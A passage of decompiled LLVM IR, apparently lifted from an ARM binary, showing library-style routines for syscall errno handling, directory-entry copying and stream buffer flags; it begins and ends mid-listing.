229, 1, 36, 37, 38, 39, 40, 41, 129, 230, 89, 231, 232, 233, 234, 235, 236, 2, 42, 43, 44, 45, 46, 47, 131, 237, 130, 238, 239, 240, 241, 242, 243, 133, 244, 134, 245, 135, 246, 48, 3, 49, 50, 51, 52, 53, 136, 247, 132, 248, 249, 250, 251, 252, 253, 138, 254, 139, 255, 140, 256, 54, 4, 55, 56, 57, 58, 59, 141, 257, 137, 258, 259, 261, 142, 260, 143, 144, 262, 62, 263, 264, 265, 266, 267, 268, 146, 145, 269, 280, 63, 281, 282, 148, 283, 149, 284, 285, 286, 287, 288, 150, 289, 147, 290, 78, 272, 151, 79, 198, 158 }
  uselistorder label %dec_label_pc_15d04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d00, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_15c84, { 1, 0 }
  uselistorder label %dec_label_pc_15c4c, { 1, 0 }
}

define i32 @function_15d14(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d14:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 124820, i32* %r2.global-to-local, align 4
  %v4_15d20 = load i32, i32* inttoptr (i32 124920 to i32*), align 8
  %v4_15d28 = load i32, i32* inttoptr (i32 124884 to i32*), align 4
  store i32 %v4_15d28, i32* %r1.global-to-local, align 4
  %v1_15d2c = add i32 %arg1, 44
  %v2_15d2c = inttoptr i32 %v1_15d2c to i32*
  %v3_15d2c = load i32, i32* %v2_15d2c, align 4
  %v1_15d30 = add i32 %arg1, 28
  %v2_15d30 = inttoptr i32 %v1_15d30 to i32*
  %v3_15d30 = load i32, i32* %v2_15d30, align 4
  store i32 %v3_15d30, i32* %r2.global-to-local, align 4
  %v2_15d34 = inttoptr i32 %v4_15d20 to i32*
  store i32 %v3_15d2c, i32* %v2_15d34, align 4
  %v0_15d38 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d38 = load i32, i32* %r1.global-to-local, align 4
  %v2_15d38 = inttoptr i32 %v1_15d38 to i32*
  store i32 %v0_15d38, i32* %v2_15d38, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 40, 1, 2, 4, 5, 6, 3, 7, 8, 9, 13, 10, 14, 12, 24, 25, 26, 27, 28, 29, 21, 22, 23, 19, 20, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 11, 0, 15, 16, 17, 18 }
  uselistorder i32 124820, { 40, 0, 41, 42, 1, 2, 43, 3, 4, 5, 44, 45, 6, 7, 46, 8, 47, 48, 49, 50, 9, 35, 31, 29, 28, 30, 32, 33, 34, 27, 36, 22, 24, 23, 21, 20, 25, 26, 17, 16, 19, 18, 15, 14, 13, 12, 37, 38, 39, 51, 52, 53, 10, 11 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_15d44(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d44:
  %v0_15d44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15d44, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15d44
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15d44, %bb
  %v4_15d48 = phi i32 [ %arg1, %dec_label_pc_15d44 ], [ 0, %bb ]
  ret i32 %v4_15d48

; uselistorder directives
  uselistorder i1* @cpsr_z, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 31, 12, 13, 14, 27, 28, 29, 30, 15, 16, 17, 18, 19, 20, 25, 26, 0, 21, 22, 23, 24, 1, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15d4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d88:
  store i32 %arg1, i32* @global_var_20a58.493, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_20a58.493, { 1, 0, 2 }
}

define i32 @function_15d98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15d98:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15d98 = load i32, i32* @r7, align 4
  store i32 %v3_15d98, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15dc0, label %dec_label_pc_15db0

dec_label_pc_15db0:                               ; preds = %dec_label_pc_15d98
  %v0_15db0 = call i32 @function_11204()
  %v0_15db4 = load i32, i32* %r7.global-to-local, align 4
  %v1_15db4 = sub i32 0, %v0_15db4
  %v2_15db8 = inttoptr i32 %v0_15db0 to i32*
  store i32 %v1_15db4, i32* %v2_15db8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15dc4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15dc0

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15d98, %dec_label_pc_15db0
  %v2_15dc4 = phi i32 [ %v3_15d98, %dec_label_pc_15d98 ], [ %v2_15dc4.pre, %dec_label_pc_15db0 ]
  %v0_15dc0 = phi i32 [ %arg1, %dec_label_pc_15d98 ], [ -1, %dec_label_pc_15db0 ]
  store i32 %v2_15dc4, i32* %r7.global-to-local, align 4
  ret i32 %v0_15dc0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15dc0, { 1, 0 }
}

define i32 @function_15dcc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15dcc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15dd0 = load i32, i32* @r4, align 4
  %v6_15dd0 = load i32, i32* @r5, align 4
  %v12_15dd0 = load i32, i32* @r7, align 4
  %v1_15dd4 = add i32 %arg3, 14
  %v2_15ddc = ptrtoint i32* %stack_var_-72 to i32
  %v1_15de0 = and i32 %v1_15dd4, -8
  %v2_15de4 = sub i32 %v2_15ddc, %v1_15de0
  %v1_15de8 = add i32 %v2_15de4, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_15de8, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_15e24, label %dec_label_pc_15e10

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15dcc
  %v0_15e10 = call i32 @function_11204()
  %v0_15e14 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e14 = sub i32 0, %v0_15e14
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15e1c = inttoptr i32 %v0_15e10 to i32*
  store i32 %v1_15e14, i32* %v2_15e1c, align 4
  %v0_15e2c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e2c

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15dcc
  br i1 false, label %dec_label_pc_15e2c, label %dec_label_pc_15e34

dec_label_pc_15e2c:                               ; preds = %dec_label_pc_15e24, %dec_label_pc_15e10
  %v0_15e2c = phi i32 [ -1, %dec_label_pc_15e24 ], [ %v0_15e2c.pre, %dec_label_pc_15e10 ]
  store i32 %v0_15e2c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15f00

dec_label_pc_15e34:                               ; preds = %dec_label_pc_15e24
  %v2_15e34 = add i32 %v1_15de8, %arg1
  %v2_15e38 = add i32 %tmp, %arg3
  store i32 %v2_15e38, i32* @ip, align 4
  store i32 %v1_15de8, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15ee8

dec_label_pc_15e54:                               ; preds = %dec_label_pc_15ee8
  %v1_15e54 = add i32 %v0_15ea8, 16
  %v2_15e54 = inttoptr i32 %v1_15e54 to i16*
  %v3_15e54 = load i16, i16* %v2_15e54, align 2
  %v4_15e54 = zext i16 %v3_15e54 to i32
  %v1_15e58 = add nuw nsw i32 %v4_15e54, 7
  %v1_15e5c = and i32 %v1_15e58, 131064
  store i32 %v1_15e5c, i32* %r2.global-to-local, align 4
  %v2_15e64 = add i32 %v1_15e5c, %v0_15eb0
  store i32 %v2_15e64, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_15e64, %v2_15e38
  br i1 %tmp26, label %dec_label_pc_15e70, label %dec_label_pc_15ea4

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e54
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_15e78 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15e78, i32* %r2.global-to-local, align 4
  %v0_15e7c = load i32, i32* %sl.global-to-local, align 4
  %v1_15e80 = load i32, i32* @sp, align 4
  %v2_15e80 = inttoptr i32 %v1_15e80 to i32*
  store i32 0, i32* %v2_15e80, align 4
  %v4_15e84 = call i32 @function_16108(i32 %arg1, i32 0, i32 %v0_15e78, i32 %v0_15e7c)
  %v0_15e88 = load i32, i32* @r5, align 4
  %v1_15e88 = load i32, i32* %r6.global-to-local, align 4
  %v9_15e88 = icmp eq i32 %v0_15e88, %v1_15e88
  br i1 %v9_15e88, label %dec_label_pc_15e90, label %dec_label_pc_15efc

dec_label_pc_15e90:                               ; preds = %dec_label_pc_15e70
  %v0_15e90 = call i32 @function_11204()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_15e9c = inttoptr i32 %v0_15e90 to i32*
  store i32 22, i32* %v2_15e9c, align 4
  %v0_15f00.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15f00

dec_label_pc_15ea4:                               ; preds = %dec_label_pc_15e54
  %v1_15ea4 = inttoptr i32 %v0_15ea8 to i32*
  %v2_15ea4 = load i32, i32* %v1_15ea4, align 4
  %v3_15ea4 = add i32 %v0_15ea8, 4
  %v4_15ea4 = inttoptr i32 %v3_15ea4 to i32*
  %v5_15ea4 = load i32, i32* %v4_15ea4, align 4
  store i32 %v5_15ea4, i32* %r4.global-to-local, align 4
  %v1_15ea8 = add i32 %v0_15ea8, 8
  store i32 %v1_15ea8, i32* %sb.global-to-local, align 4
  %v1_15eac = inttoptr i32 %v1_15ea8 to i32*
  %v2_15eac = load i32, i32* %v1_15eac, align 4
  store i32 %v2_15eac, i32* %sb.global-to-local, align 4
  %v3_15eac = add i32 %v0_15ea8, 12
  %v4_15eac = inttoptr i32 %v3_15eac to i32*
  %v5_15eac = load i32, i32* %v4_15eac, align 4
  store i32 %v5_15eac, i32* %sl.global-to-local, align 4
  %v1_15eb0 = inttoptr i32 %v0_15eb0 to i32*
  store i32 %v2_15ea4, i32* %v1_15eb0, align 4
  %v3_15eb0 = add i32 %v0_15eb0, 4
  %v4_15eb0 = inttoptr i32 %v3_15eb0 to i32*
  %v5_15eb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15eb0, i32* %v4_15eb0, align 4
  %v0_15eb4 = load i32, i32* @r7, align 4
  %v1_15eb4 = add i32 %v0_15eb4, 8
  %v1_15eb8 = inttoptr i32 %v1_15eb4 to i32*
  %v2_15eb8 = load i32, i32* %v1_15eb8, align 4
  %v3_15eb8 = add i32 %v0_15eb4, 12
  %v4_15eb8 = inttoptr i32 %v3_15eb8 to i32*
  %v5_15eb8 = load i32, i32* %v4_15eb8, align 4
  store i32 %v5_15eb8, i32* @r4, align 4
  %v1_15ebc = load i32, i32* @r5, align 4
  %v2_15ebc = add i32 %v1_15ebc, 8
  %v3_15ebc = inttoptr i32 %v2_15ebc to i32*
  store i32 %v2_15eb8, i32* %v3_15ebc, align 4
  %v0_15ec0 = load i32, i32* @r4, align 4
  %v1_15ec0 = load i32, i32* @r5, align 4
  %v2_15ec0 = add i32 %v1_15ec0, 12
  %v3_15ec0 = inttoptr i32 %v2_15ec0 to i32*
  store i32 %v0_15ec0, i32* %v3_15ec0, align 4
  %v0_15ec4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ec4 = trunc i32 %v0_15ec4 to i16
  %v2_15ec4 = load i32, i32* @r5, align 4
  %v3_15ec4 = add i32 %v2_15ec4, 16
  %v4_15ec4 = inttoptr i32 %v3_15ec4 to i16*
  store i16 %v1_15ec4, i16* %v4_15ec4, align 2
  %v0_15ec8 = load i32, i32* @r7, align 4
  %v1_15ec8 = add i32 %v0_15ec8, 18
  %v2_15ec8 = inttoptr i32 %v1_15ec8 to i8*
  %v3_15ec8 = load i8, i8* %v2_15ec8, align 1
  %v4_15ec8 = zext i8 %v3_15ec8 to i32
  store i32 %v4_15ec8, i32* @r3, align 4
  %v2_15ecc = load i32, i32* @r5, align 4
  %v3_15ecc = add i32 %v2_15ecc, 18
  %v4_15ecc = inttoptr i32 %v3_15ecc to i8*
  store i8 %v3_15ec8, i8* %v4_15ecc, align 1
  %v0_15ed0 = load i32, i32* @r7, align 4
  %v1_15ed0 = add i32 %v0_15ed0, 16
  %v2_15ed0 = inttoptr i32 %v1_15ed0 to i16*
  %v3_15ed0 = load i16, i16* %v2_15ed0, align 2
  %v4_15ed0 = zext i16 %v3_15ed0 to i32
  %v1_15ed4 = add nsw i32 %v4_15ed0, -19
  store i32 %v1_15ed4, i32* @r2, align 4
  %v0_15ed8 = call i32 @function_11310()
  %v0_15edc = load i32, i32* @r7, align 4
  %v1_15edc = add i32 %v0_15edc, 16
  %v2_15edc = inttoptr i32 %v1_15edc to i16*
  %v3_15edc = load i16, i16* %v2_15edc, align 2
  %v4_15edc = zext i16 %v3_15edc to i32
  %v0_15ee0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15ee0, i32* @r5, align 4
  %v2_15ee4 = add i32 %v4_15edc, %v0_15edc
  store i32 %v2_15ee4, i32* @r7, align 4
  br label %dec_label_pc_15ee8

dec_label_pc_15ee8:                               ; preds = %dec_label_pc_15e34, %dec_label_pc_15ea4
  %v0_15eb0 = phi i32 [ %tmp, %dec_label_pc_15e34 ], [ %v0_15ee0, %dec_label_pc_15ea4 ]
  %v0_15ea8 = phi i32 [ %v1_15de8, %dec_label_pc_15e34 ], [ %v2_15ee4, %dec_label_pc_15ea4 ]
  %v3_15eec = icmp ult i32 %v0_15ea8, %v2_15e34
  %v1_15ef0 = add i32 %v0_15eb0, 19
  store i32 %v1_15ef0, i32* @r0, align 4
  %v1_15ef4 = add i32 %v0_15ea8, 19
  store i32 %v1_15ef4, i32* @r1, align 4
  br i1 %v3_15eec, label %dec_label_pc_15e54, label %dec_label_pc_15efc.loopexit

dec_label_pc_15efc.loopexit:                      ; preds = %dec_label_pc_15ee8
  %v0_15efc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15efc

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15efc.loopexit, %dec_label_pc_15e70
  %v1_15efc = phi i32 [ %v0_15eb0, %dec_label_pc_15efc.loopexit ], [ %v0_15e88, %dec_label_pc_15e70 ]
  %v0_15efc = phi i32 [ %v0_15efc.pre, %dec_label_pc_15efc.loopexit ], [ %v1_15e88, %dec_label_pc_15e70 ]
  %v2_15efc = sub i32 %v1_15efc, %v0_15efc
  store i32 %v2_15efc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15f00

dec_label_pc_15f00:                               ; preds = %dec_label_pc_15e90, %dec_label_pc_15e2c, %dec_label_pc_15efc
  %v0_15f00 = phi i32 [ %v0_15f00.pre, %dec_label_pc_15e90 ], [ %v0_15e2c, %dec_label_pc_15e2c ], [ %v2_15efc, %dec_label_pc_15efc ]
  store i32 %v3_15dd0, i32* %r4.global-to-local, align 4
  store i32 %v6_15dd0, i32* @r5, align 4
  store i32 %v12_15dd0, i32* @r7, align 4
  ret i32 %v0_15f00

; uselistorder directives
  uselistorder i32 %v0_15ea8, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_15eb0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_15de8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 8, 9, 0, 3, 10, 4, 11, 12, 5, 6, 7, 1, 13, 2, 14 }
  uselistorder i32* @r3, { 7, 8, 52, 53, 85, 86, 2, 87, 88, 89, 3, 90, 91, 92, 4, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 0, 111, 112, 113, 114, 9, 6, 10, 11, 12, 13, 14, 54, 55, 115, 124, 125, 126, 119, 47, 48, 78, 79, 80, 81, 82, 76, 77, 15, 16, 17, 130, 127, 128, 129, 1, 131, 132, 133, 120, 18, 83, 38, 39, 40, 121, 122, 123, 70, 56, 116, 117, 118, 49, 50, 51, 57, 58, 5, 59, 60, 61, 62, 32, 33, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 37, 41, 42, 44, 43, 84, 45, 46, 63, 64, 65, 66, 67, 68, 69, 71, 72, 73, 74, 75 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 12, 2, 3, 4, 5, 6, 7, 13, 14, 8, 9, 10, 11 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 7, { 24, 22, 23, 14, 0, 1, 41, 15, 29, 16, 25, 17, 26, 18, 27, 19, 28, 2, 20, 30, 21, 31, 4, 32, 5, 33, 6, 7, 34, 8, 35, 9, 36, 10, 37, 11, 12, 38, 13, 40, 3, 39 }
  uselistorder i32* @ip, { 7, 8, 9, 78, 10, 11, 6, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 2, 112, 113, 114, 115, 116, 117, 118, 119, 120, 12, 0, 13, 14, 15, 16, 17, 121, 122, 40, 64, 65, 66, 67, 3, 68, 69, 70, 58, 59, 60, 61, 62, 63, 71, 72, 73, 126, 123, 124, 125, 1, 127, 27, 28, 29, 30, 18, 19, 74, 75, 76, 31, 32, 33, 52, 53, 54, 55, 56, 57, 44, 45, 46, 47, 48, 49, 4, 22, 20, 23, 24, 50, 51, 77, 21, 25, 26, 34, 35, 36, 37, 38, 39, 41, 5, 42, 43 }
  uselistorder i1 false, { 0, 25, 26, 27, 38, 21, 24, 39, 40, 41, 42, 43, 2, 1, 28, 31, 30, 29, 32, 4, 6, 5, 18, 37, 22, 23, 10, 35, 17, 19, 20, 9, 8, 7, 11, 12, 13, 33, 3, 14, 15, 16, 36, 34, 44 }
  uselistorder i32 -8, { 37, 17, 18, 19, 20, 21, 22, 16, 15, 9, 14, 13, 12, 11, 23, 24, 25, 26, 27, 39, 28, 29, 30, 31, 32, 38, 40, 33, 41, 36, 10, 34, 35, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 14, { 10, 14, 26, 6, 7, 8, 0, 11, 12, 9, 3, 13, 4, 15, 16, 5, 17, 18, 19, 20, 1, 21, 22, 23, 24, 2, 25 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15f00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ee8, { 1, 0 }
}

define i32 @function_15f10(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15f10:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15f10 = load i32, i32* @r4, align 4
  store i32 %v3_15f10, i32* %stack_var_-12, align 4
  %v0_15f14 = load i32, i32* %r0.global-to-local, align 4
  %v1_15f14 = inttoptr i32 %v0_15f14 to i16*
  %v2_15f14 = load i16, i16* %v1_15f14, align 2
  %v3_15f14 = zext i16 %v2_15f14 to i32
  %v1_15f18 = and i32 %v3_15f14, 4
  store i32 %v1_15f18, i32* %r5.global-to-local, align 4
  %v2_15f18 = icmp eq i32 %v1_15f18, 0
  store i32 %v0_15f14, i32* %r4.global-to-local, align 4
  br i1 %v2_15f18, label %dec_label_pc_15f2c, label %bb

bb:                                               ; preds = %dec_label_pc_15f10
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_15f2c:                               ; preds = %dec_label_pc_15f10
  %v1_15f2c = icmp slt i32 %arg2, 0
  br i1 %v1_15f2c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_15f2c
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_15f2c, %bb18
  %v1_15f34 = add i32 %v0_15f14, 4
  %v2_15f34 = inttoptr i32 %v1_15f34 to i32*
  %v3_15f34 = load i32, i32* %v2_15f34, align 4
  store i32 %v3_15f34, i32* %r0.global-to-local, align 4
  %v1_15f38 = call i32 @function_10b74(i32 %v3_15f34)
  store i32 %v1_15f38, i32* %r0.global-to-local, align 4
  %v5_15f40 = icmp sgt i32 %v1_15f38, 0
  br i1 %v5_15f40, label %.thread7, label %dec_label_pc_15f44

dec_label_pc_15f44:                               ; preds = %bb19
  %v2_15f3c = icmp eq i32 %v1_15f38, 0
  %v0_15f44 = load i32, i32* %r4.global-to-local, align 4
  %v1_15f44 = inttoptr i32 %v0_15f44 to i16*
  %v2_15f44 = load i16, i16* %v1_15f44, align 2
  br i1 %v2_15f3c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15f44
  %v2_15f48 = or i16 %v2_15f44, 4
  store i16 %v2_15f48, i16* %v1_15f44, align 2
  %v1_15f64.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_15f44
  %v2_15f4c = or i16 %v2_15f44, 8
  store i16 %v2_15f4c, i16* %v1_15f44, align 2
  %v1_15f58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15f58, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_15f64 = phi i32 [ %v1_15f64.pre, %bb20 ], [ 0, %bb ], [ %v1_15f38, %bb19 ], [ %v1_15f58, %bb21 ]
  %v2_15f60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15f60, i32* @r4, align 4
  ret i32 %v1_15f64

; uselistorder directives
  uselistorder i16 %v2_15f44, { 1, 0 }
  uselistorder i32 %v1_15f38, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_10b74, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_15f68(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15f68:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_15f68 = load i32, i32* @r4, align 4
  store i32 %v3_15f68, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_15f802 = icmp eq i32 %arg3, 0
  store i1 %v2_15f802, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f802, label %dec_label_pc_16010, label %dec_label_pc_15f88

dec_label_pc_15f80thread-pre-split:               ; preds = %dec_label_pc_15f88
  %v3_15fa0 = load i32, i32* %r6.global-to-local, align 4
  %v5_15fa0 = add i32 %v3_15fa0, %v3_15f98
  store i32 %v5_15fa0, i32* %r6.global-to-local, align 4
  %v4_15fa4 = load i32, i32* %r5.global-to-local, align 4
  %v5_15fa4 = sub i32 %v4_15fa4, %v3_15f98
  store i32 %v5_15fa4, i32* %r5.global-to-local, align 4
  %v2_15f80 = icmp eq i32 %v5_15fa4, 0
  store i1 %v2_15f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f80, label %dec_label_pc_15f80.dec_label_pc_16010.loopexit_crit_edge, label %dec_label_pc_15f80thread-pre-split.dec_label_pc_15f88_crit_edge

dec_label_pc_15f80thread-pre-split.dec_label_pc_15f88_crit_edge: ; preds = %dec_label_pc_15f80thread-pre-split
  %v3_15f88.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15f94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15f88

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f68, %dec_label_pc_15f80thread-pre-split.dec_label_pc_15f88_crit_edge
  %v0_15f94 = phi i32 [ %v0_15f94.pre, %dec_label_pc_15f80thread-pre-split.dec_label_pc_15f88_crit_edge ], [ %tmp, %dec_label_pc_15f68 ]
  %v0_15f90 = phi i32 [ %v5_15fa0, %dec_label_pc_15f80thread-pre-split.dec_label_pc_15f88_crit_edge ], [ %arg2, %dec_label_pc_15f68 ]
  %v3_15f88 = phi i32 [ %v3_15f88.pre, %dec_label_pc_15f80thread-pre-split.dec_label_pc_15f88_crit_edge ], [ 2147483647, %dec_label_pc_15f68 ]
  %v0_15f8c.in = phi i32 [ %v5_15fa4, %dec_label_pc_15f80thread-pre-split.dec_label_pc_15f88_crit_edge ], [ %arg3, %dec_label_pc_15f68 ]
  %v3_15f8c = phi i32 [ %v5_15fa4, %dec_label_pc_15f80thread-pre-split.dec_label_pc_15f88_crit_edge ], [ %arg3, %dec_label_pc_15f68 ]
  %v0_15f8c = icmp slt i32 %v0_15f8c.in, 0
  %storemerge = select i1 %v0_15f8c, i32 %v3_15f88, i32 %v3_15f8c
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_15f90, i32* %r1.global-to-local, align 4
  %v1_15f94 = add i32 %v0_15f94, 4
  %v2_15f94 = inttoptr i32 %v1_15f94 to i32*
  %v3_15f94 = load i32, i32* %v2_15f94, align 4
  %v3_15f98 = call i32 @function_10ce8(i32 %v3_15f94, i32 %v0_15f90)
  %v1_15f9c = icmp slt i32 %v3_15f98, 0
  %v2_15f9c = icmp eq i32 %v3_15f98, 0
  store i1 %v2_15f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15f9c, label %dec_label_pc_15fac, label %dec_label_pc_15f80thread-pre-split

dec_label_pc_15fac:                               ; preds = %dec_label_pc_15f88
  %v0_15fac = load i32, i32* %r4.global-to-local, align 4
  %v1_15fac = inttoptr i32 %v0_15fac to i16*
  %v2_15fac = load i16, i16* %v1_15fac, align 2
  %v3_15fac = zext i16 %v2_15fac to i32
  store i32 %v3_15fac, i32* %r3.global-to-local, align 4
  %v1_15fb0 = add i32 %v0_15fac, 8
  store i32 %v1_15fb0, i32* %r1.global-to-local, align 4
  %v1_15fb4 = inttoptr i32 %v1_15fb0 to i32*
  %v2_15fb4 = load i32, i32* %v1_15fb4, align 4
  store i32 %v2_15fb4, i32* %r1.global-to-local, align 4
  %v3_15fb4 = add i32 %v0_15fac, 12
  %v4_15fb4 = inttoptr i32 %v3_15fb4 to i32*
  %v5_15fb4 = load i32, i32* %v4_15fb4, align 4
  %v1_15fb8 = or i32 %v3_15fac, 8
  store i32 %v1_15fb8, i32* %r3.global-to-local, align 4
  %v2_15fbc = sub i32 %v5_15fb4, %v2_15fb4
  store i32 %v2_15fbc, i32* %r2.global-to-local, align 4
  %v9_15fbc = icmp eq i32 %v5_15fb4, %v2_15fb4
  store i1 %v9_15fbc, i1* %cpsr_z.global-to-local, align 1
  %v1_15fc0 = trunc i32 %v1_15fb8 to i16
  store i16 %v1_15fc0, i16* %v1_15fac, align 2
  br i1 %v9_15fbc, label %dec_label_pc_15fac.dec_label_pc_1600c_crit_edge, label %dec_label_pc_15fc8

dec_label_pc_15fac.dec_label_pc_1600c_crit_edge:  ; preds = %dec_label_pc_15fac
  %v0_1600c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1600c

dec_label_pc_15fc8:                               ; preds = %dec_label_pc_15fac
  %v0_15fc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fc8 = load i32, i32* %r5.global-to-local, align 4
  %v3_15fc8 = icmp ult i32 %v0_15fc8, %v1_15fc8
  %v9_15fc8 = icmp eq i32 %v0_15fc8, %v1_15fc8
  store i1 %v9_15fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15fc8, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_15fc8
  store i32 %v1_15fc8, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_15fc8, %bb23
  %v2_15fdc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

